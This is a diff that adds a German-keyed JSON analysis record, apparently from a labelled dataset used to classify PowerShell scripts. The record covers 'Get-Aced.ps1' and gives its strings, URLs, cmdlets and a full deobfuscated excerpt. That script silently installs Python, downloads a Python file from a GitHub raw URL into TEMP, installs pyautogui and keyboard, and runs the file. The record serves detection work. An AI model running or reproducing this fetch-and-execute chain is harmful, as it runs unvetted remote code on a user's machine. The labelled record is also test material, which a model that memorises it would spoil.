@@ -1,0 +1,113 @@
+{
+  "meta": {
+    "quelldatei": "tech_003_Get-Aced.ps1",
+    "sha256": "18acbb721857a826d65f73c3eb3d3e3c45a83f8660484d20a2be4d8a8acb8251",
+    "groesse_bytes": 981,
+    "zeilen": 35,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Programs\\Python",
+      "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py",
+      "Overlay-Ace.py",
+      "pip",
+      "install pyautogui keyboard",
+      "pip3"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Programs\\Python",
+      "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py",
+      "Overlay-Ace.py",
+      "pip",
+      "install pyautogui keyboard",
+      "pip3"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Invoke-WebRequest",
+      "Join-Path",
+      "Overlay-Ace",
+      "Overlay-AceVentura",
+      "Remove-Item",
+      "Start-Process",
+      "Test-Path"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 2,
+      "start_process": 3
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py",
+        "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA",
+        "$env:TEMP"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Programs\\Python",
+      "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe",
+      "python_installer.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py",
+      "Overlay-Ace.py",
+      "pip",
+      "install pyautogui keyboard",
+      "pip3"
+    ],
+    "string_anzahl_gesamt": 10,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Invoke-WebRequest",
+      "Join-Path",
+      "Overlay-Ace",
+      "Overlay-AceVentura",
+      "Remove-Item",
+      "Start-Process",
+      "Test-Path"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 2,
+      "start_process": 3
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py",
+        "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:LOCALAPPDATA",
+        "$env:TEMP"
+      ]
+    },
+    "deobfuskiert_auszug": "$pythonPath = Join-Path $env:LOCALAPPDATA \"Programs\\Python\"\r\n\r\nif (Test-Path -Path $pythonPath) {\r\n} else {\r\n    \r\n    $installerUrl = \"https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe\"\r\n\r\n    $installerPath = Join-Path $env:TEMP \"python_installer.exe\"\r\n    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath\r\n\r\n    Start-Process -FilePath $installerPath -Args \"/quiet InstallAllUsers=1 PrependPath=1\" -Wait\r\n\r\n    Remove-Item -Path $installerPath\r\n\r\n}\r\n\r\n$scriptUrl = \"https://raw.githubusercontent.com/calinux-py/Python/main/Overlay-AceVentura/Overlay-Ace.py\"\r\n\r\n$scriptPath = Join-Path $env:TEMP \"Overlay-Ace.py\"\r\n\r\nInvoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath\r\n\r\ntry {\r\n    Start-Process -FilePath \"pip\" -Args \"install pyautogui keyboard\" -NoNewWindow -Wait\r\n} catch {\r\n    Start-Process -FilePath \"pip3\" -Args \"install pyautogui keyboard\" -NoNewWindow -Wait\r\n}\r\n\r\ntry {\r\n    & python $scriptPath\r\n} catch {\r\n    & python3 $scriptPath\r\n}\r\n\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Web-Anfrage senden",
+      "Prozess starten"
+    ]
+  }
+}
